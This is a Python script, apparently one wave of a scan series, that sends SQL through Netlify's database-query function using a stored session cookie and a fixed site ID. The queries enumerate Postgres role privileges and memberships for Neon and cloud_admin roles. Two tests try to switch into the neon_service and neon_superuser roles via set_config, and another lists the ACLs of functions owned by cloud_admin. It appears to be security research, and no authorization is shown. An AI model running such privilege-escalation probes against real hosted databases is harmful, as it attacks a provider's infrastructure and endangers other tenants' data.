# -*- coding: utf-8 -*-
"""波17:角色组合面——neon_service/neon_superuser 标志 + 成员关系 + cloud_admin 函数 ACL 全表
H1 所有角色完整标志 / H2 pg_auth_members(我在哪个组)/ H3 SET ROLE 尝试 / H4 cloud_admin 非 catalog 函数 ACL
"""
import http.client, ssl, gzip, brotli, json, sys, time
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_NET

SITE_ID = '04f08ff6-f274-47ac-b6d7-5fb1e055f3b4'
ctx = ssl.create_default_context()
P = '/.netlify/functions/database-query'


def q(sql, timeout=60):
    t0 = time.time()
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0',
         'Accept-Encoding': 'br, gzip', 'Accept': 'application/json', 'Cookie': COOKIE_NET,
         'Content-Type': 'application/json'}
    body = {'siteId': SITE_ID, 'action': 'query', 'sql': sql}
    conn.request('POST', P, body=json.dumps(body).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    conn.close()
    return st, raw[:6000].decode('utf-8', 'ignore'), round(time.time() - t0, 1)


tests = [
    ('H1_role_flags', """select rolname, rolsuper, rolinherit, rolcreaterole, rolcreatedb, rolcanlogin,
        rolreplication, rolbypassrls, rolconnlimit
        from pg_roles where rolname in ('cloud_admin','neon_service','neon_superuser','netlifydb_owner','netlifydb_readonly','postgres')
        order by rolname"""),
    ('H2_membership', """select r.rolname as member, g.rolname as grp
        from pg_auth_members m
        join pg_roles r on m.member = r.oid
        join pg_roles g on m.roleid = g.oid
        where r.rolname = current_user or g.rolname in ('neon_service','neon_superuser','cloud_admin')"""),
    ('H3_setrole_ns', "select set_config('role', 'neon_service', false)"),
    ('H3b_setrole_nsu', "select set_config('role', 'neon_superuser', false)"),
    ('H4_ca_funcs_full', """select p.proname, p.prosecdef, p.proisstrict, p.provolatile,
        pg_get_function_identity_arguments(p.oid) as args,
        coalesce(array_to_string(p.proacl::text[], ','), 'NULL') as acl
        from pg_proc p
        join pg_namespace n on p.pronamespace = n.oid
        join pg_roles r on p.proowner = r.oid
        where r.rolname = 'cloud_admin'
        and n.nspname not in ('pg_catalog', 'information_schema')
        order by n.nspname, p.proname"""),
    ('H5_neon_schema', """select n.nspname from pg_namespace n
        where n.nspname like 'neon%' or n.nspname like '%neon%' or n.nspname = 'public' order by 1"""),
]
for label, sql in tests:
    s, b, dt = q(sql)
    print('%-18s [%d] %.1fs' % (label, s, dt))
    print('   ' + b[:5500].replace('\n', ' '))
    print()
